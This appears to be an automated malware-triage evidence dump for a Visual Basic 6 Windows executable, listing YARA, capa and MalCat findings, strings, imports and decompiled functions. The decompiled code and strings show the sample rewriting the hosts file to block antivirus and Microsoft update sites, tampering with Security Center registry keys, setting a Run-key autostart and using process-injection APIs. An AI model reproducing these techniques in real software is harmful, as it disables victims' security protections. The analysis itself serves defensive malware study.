## Tool evidence (stage=quick_scan, signal-prioritized)
<!-- stage: quick_scan | sha=8059ade0d39e4c82 | packaging=v6.1 -->

## MalCat evidence
  File: type=PE, architecture=X86, entropy=135, sha256=8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075
  Anomalies (10): BoundImports (imports), InvalidChecksum (integrity), PossibleDownloaderApiDynamicImport (imports), PossiblePackerApiDynamicImport×5 (imports), StackArrayInitialisationX86×4 (code), UnknownOverlayMediumToHighEntropy (entropy), UnknownRootResourceDirectoryId (resources), UnparsedVersionInfo (resources), VBExternalApi×3 (imports), XorInLoop×2 (code)
  High-signal anomaly locations: XorInLoop@21773,22545
  YARA (signal): Wscript
  YARA (info, 7 total): MSVC_6_linker, VisualBasic, CreateRegistryEntryUsingBatch, AutorunKey, RunShell, ms_visual_basic_50_60_01, ms_visual_basic_50_01
  Functions (15): sub_408d80@36224, sub_405330@21296, sub_40a3ac@41900, sub_409380@37760, sub_40b800@47104, sub_40bda0@48544, sub_405f50@24400, sub_4058ae@22702, sub_40c970@51568, sub_407f40@32576, sub_407180@29056, sub_405cc0@23744, sub_4073e0@29664, sub_4082b0@33456, sub_407820@30752
  Top high-signal imports (score≥8, 2 of 125):
    [10] msvbvm60.__vbaAryDestruct ×26
    [10] advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorA ×2
  Mid-signal imports: kernel32.GetProcAddress, kernel32.LoadLibraryA
  (low-signal/noise imports: 121 omitted)
  - Constants/registry (1): registry::HKEY_LOCAL_MACHINE×2
  Strings/ips (64 total): 127.0.2.5\tliveu..veupdate.com\r\n, 127.0.2.5\tsecur..symantec.com\r\n, 127.0.2.5\twindo..icrosoft.com\r\n, 127.0.2.5\twww.n..sociates.com\r\n, 127.0.2.5\thouse..endmicro.com\r\n, 127.0.2.5\tcusto..symantec.com\r\n, 127.0.2.5\tnetwo..sociates.com\r\n, 127.0.2.5\tliveu..symantec.com\r\n, 127.0.2.5\twww.p..software.com\r\n, 127.0.2.5\tupdat..symantec.com\r\n, 127.0.2.5\tvirus..an.jotti.org\r\n, 127.0.2.5\twww.microsoft.com\r\n, 127.0.2.5\tdownl..d.mcafee.com\r\n, 127.0.2.5\tupdat..icrosoft.com\r\n, 127.0.2.5\tdispa..h.mcafee.com\r\n
  Strings/registry (3 total): HKCU\Software\Mi..rrentVersion\Run, SOFTWARE\Microso..\Policies\System, SOFTWARE\Microso..\Security Center
  Strings/paths (3 total): C:\WINDOWS\syste..rivers\etc\hosts, C:\Program Files..dio\VB98\VB6.OLB, @*\AC:\Users\Own..oad\Project1.vbp
  Strings/apis (31 total): ShellExecuteW, GetEnvironmentVariableW, NtAllocateVirtualMemory, NtSetContextThread, NtGetContextThread, RtlGetCurrentPeb, GetModuleFileNameA, FreeResource, CreateProcessW, FreeLibrary, CreateFolder, NtWriteVirtualMemory, WriteLine, NtResumeThread, NtDelayExecution
  Strings (other, 199 items, omitted)
  Carved files (12): DIB@19932 (744 bytes), DIB@20676 (296 bytes), DIB@66320 (1736 bytes), DIB@68056 (1864 bytes), DIB@69920 (2216 bytes), DIB@72136 (3240 bytes), DIB@75376 (1128 bytes), DIB@76504 (2440 bytes), DIB@78944 (4264 bytes), DIB@83208 (9640 bytes)
  Virtual files (14): ICO/1/unk, ICO/2/unk, ICO/3/unk, ICO/4/unk, ICO/5/unk, ICO/6/unk, ICO/7/unk, ICO/8/unk, ICO/30001/unk, ICO/30002/unk
  Recovered structures (98): MZ, RichHeader, PE, OptionalHeader, Sections, BoundImportTable, BoundImportNames, kernel32.FT, user32.FT, msvbvm60.FT, VBExternalTable, VBObj.Module1, VBObj.Module14, VBObj.Module2, VBObj.Module3
  Decompilations (3 top functions):
    ### 36224 (sub_408d80, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_408d80(void)

{
    code *pcVar1;
    code *pcVar2;
    int32_t iVar3;
    undefined4 *unaff_FS_OFFSET;
    int32_t iStack_80;
    undefined4 uStack_7c;
    undefined4 uStack_74;
    undefined4 uStack_6c;
    undefined4 uStack_64;
    undefined4 uStack_5c;
    undefined4 uStack_54;
    undefined4 uStack_4c;
    undefined4 uStack_44;
    undefined4 uStack_3c;
    undefined4 uStack_34;
    undefined4 uStack_2c;
    undefined4 *puStack_24;
    undefined4 uStack_1c;
    undefined4 uStack_18;
    undefined4 uStack_14;
    code *pcStack_10;
    undefined *puStack_c;
    undefined4 uStack_8;
    
    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_14 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_14;
    pcVar2 = msvbvm60.__vbaRedim;
    puStack_c = &stack0xffffff44;
    uStack_8 = 0x4013a8;
    uStack_18 = 0;
    uStack_1c = 0;
    uStack_2c = 0;
    uStack_3c = 0;
    uStack_4c = 0;
    uStack_5c = 0;
    uStack_6c = 0;
    uStack_7c = 0;
    iStack_80 = 0;
    (*msvbvm60.__vbaRedim)(0x880, 0x10, &uStack_1c, 0, 1, 3, 0);
    pcVar1 = msvbvm60.__vbaVarMove;
    puStack_24 = 0x11;
    uStack_2c = 2;
    (*msvbvm60.__vbaVarMove)();
    uStack_34 = 1;
    uStack_3c = 2;
    (*pcVar1)();
    uStack_4c = 2;
    uStack_44 = 1;
    (*pcVar1)();
    uStack_54 = 0;
    uStack_5c = 2;
    (*pcVar1)();
    func_0x004058c0("Ntdll.dll", "RtlAdjustPrivilege", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 2, 0);
    puStack_24 = 0x80000002;
    uStack_2c = 3;
    (*pcVar1)();
    uStack_34 = (*msvbvm60.VarPtr)("SOFTWARE\\Microsoft\\Security Center");
    uStack_3c = 3;
    (*pcVar1)();
    uStack_44 = (*msvbvm60.VarPtr)(&uStack_18);
    uStack_4c = 3;
    (*pcVar1)();
    iStack_80 = func_0x004058c0("advapi32.dll", "RegOpenKeyW", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    if (iStack_80 == 0) {
        (*pcVar2)(0x880, 0x10, &uStack_1c, 0,
```
    ### 21296 (sub_405330, score=?)
```c
/* WARNING: Removing unreachable block (ram,0x004056dc) */

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_405330(int16_t **param_1,uint32_t *param_2)

{
    int16_t *piVar1;
    code *pcVar2;
    code *pcVar3;
    undefined uVar4;
    int16_t iVar5;
    int32_t iVar6;
    uint32_t uVar7;
    int32_t iVar8;
    code **ppcVar9;
    undefined4 uVar10;
    int32_t iVar11;
    code *pcVar12;
    uint32_t uVar13;
    undefined4 *unaff_FS_OFFSET;
    bool bVar14;
    int32_t iVar15;
    uint32_t uStack_154;
    uint32_t uStack_150;
    undefined4 uStack_14c;
    uint32_t *puStack_148;
    code *pcStack_144;
    uint32_t *puStack_140;
    undefined4 uStack_13c;
    undefined4 uStack_138;
    undefined4 *puStack_134;
    uint32_t uStack_130;
    undefined4 uStack_12c;
    code *pcStack_128;
    uint32_t uStack_124;
    code *pcStack_120;
    undefined4 uStack_11c;
    code *pcStack_118;
    code **ppcStack_114;
    undefined4 *puStack_110;
    undefined4 uStack_10c;
    undefined **ppuStack_108;
    int16_t *piStack_104;
    undefined **ppuStack_100;
    code *pcStack_fc;
    undefined4 uStack_f8;
    undefined4 uStack_f4;
    undefined4 uStack_f0;
    int16_t **ppiStack_ec;
    uint32_t uStack_e8;
    undefined *puStack_e4;
    undefined4 uStack_e0;
    undefined4 uStack_dc;
    undefined *puStack_d8;
    undefined4 uStack_d4;
    undefined4 uStack_d0;
    uint32_t uStack_c0;
    uint32_t uStack_bc;
    undefined *puStack_8c;
    undefined *apuStack_88 [5];
    undefined4 auStack_74 [2];
    undefined4 uStack_6c;
    undefined4 uStack_64;
    undefined4 uStack_60;
    int32_t iStack_5c;
    undefined auStack_54 [12];
    int32_t iStack_48;
    undefined auStack_38 [12];
    int32_t iStack_2c;
    undefined4 uStack_20;
    uint32_t uStack_1c;
    uint32_t uStack_18;
    undefined4 uStack_14;
    code *pcStack_10;
    undefined *puStack_c;
    undefined4 uStack_8;
    
    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_14 = *unaff_FS_OFFSET;
    
```
    ### 41900 (sub_40a3ac, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_40a3ac(void)

{
    code *pcVar1;
    code *pcVar2;
    undefined4 uVar3;
    undefined4 *unaff_FS_OFFSET;
    undefined4 auStack_44 [2];
    undefined4 uStack_3c;
    undefined4 uStack_34;
    undefined4 auStack_30 [2];
    undefined4 uStack_28;
    undefined4 uStack_18;
    code *pcStack_14;
    undefined *puStack_10;
    undefined4 uStack_c;
    
    (*msvbvm60.__vbaErrorOverflow)();
    pcStack_14 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_18 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_18;
    puStack_10 = &stack0xfffffe90;
    uStack_c = 0x4013d0;
    uStack_28 = 0;
    auStack_30[0] = 0;
    uStack_34 = 0;
    uStack_3c = 0x80020004;
    auStack_44[0] = 10;
    (*msvbvm60.rtcFreeFile)(auStack_44);
    (*msvbvm60.__vbaFreeVar)();
    pcVar1 = msvbvm60.__vbaI2I4;
    uVar3 = (*msvbvm60.__vbaI2I4)("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
    (*msvbvm60.__vbaFileOpen)(2, 0xffffffff, uVar3);
    sub_40b640("127.0.2.5\\tsymantec.com\\r\\n");
    pcVar2 = msvbvm60.__vbaStrMove;
    (*msvbvm60.__vbaStrMove)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsecurityresponse.symantec.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsarc.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\twww.sarc.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (
```

## capa evidence (3 total, showing top 3)
  ATT&CK {'parts': ['Collection', 'Archive Collected Data', 'Archive via Library'], 'tactic': 'Collection', 'technique': 'Archive Collected Data', 'subtechnique': 'Archive via Library', 'id': 'T1560.002'} (1): compress data via WinAPI
  ATT&CK {'parts': ['Execution', 'Shared Modules'], 'tactic': 'Execution', 'technique': 'Shared Modules', 'subtechnique': '', 'id': 'T1129'} (1): link function at runtime on Windows
  All rules (1): compiled from Visual Basic

## pe_imports (103 imports, 2 high-signal)
  load_library (LoadLibrary) [T1129]
  get_proc_address (GetProcAddress) [T1129]

## YARA matches (17)
  Rules: domain, IP, contains_base64, Dropper_Strings, Misc_Suspicious_Strings, url, IsPE32, IsWindowsGUI, HasOverlay, HasRichSignature, Microsoft_Visual_Basic_v50v60, Microsoft_Visual_Basic_v50, Microsoft_Visual_Basic_v50_v60, Microsoft_Visual_Basic_v50_additional, Microsoft_Visual_Basic_v50v60_additional, SEH__vba, SEH_Init

## FLOSS strings (1249 total)
  paths (1): C:\Program Files (x86)\Microsoft Visual Studio\VB98\VB6.OLB
  base64 (1): ConvertStringSecurityDescriptorToSecurityDescriptorA
  apis (5): CallWindowProcA, RtlMoveMemory, GetProcAddress, LoadLibraryA, SetKernelObjectSecurity
  (other strings, 73 items omitted)

<!-- evidence_assembler: used 10592/28000 chars across 5 tools -->